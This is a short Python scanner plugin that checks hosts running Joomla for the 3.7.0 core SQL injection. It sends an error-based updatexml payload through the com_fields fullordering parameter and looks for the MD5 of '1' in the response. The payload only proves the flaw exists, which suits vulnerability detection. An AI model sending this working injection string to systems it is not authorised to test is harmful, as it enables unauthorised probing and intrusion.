import requests
from lib.verify import verify
from lib.wechat_notice import wechat
from loguru import logger
from multiprocessing.dummy import Pool as ThreadPool

vuln = ['Joomla']


def check(ip, ports, apps):
    if verify(vuln, ports, apps):
        url = 'https://' + ip
        payload = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x3a,concat(1,(select%20md5(1))),1)"
        try:
            r = requests.get(url + payload, timeout=5, verify=False)
            if ('c4ca4238a0b923820dcc509a6f75849b' in r.text) or ('SQL error ' in r.text):
                return 'Joomla 3.7.0 Core SQL Injection: ' + url
        except Exception as e:
            pass
